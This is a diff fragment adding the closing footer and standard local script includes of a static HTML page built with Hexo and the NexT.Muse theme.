+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
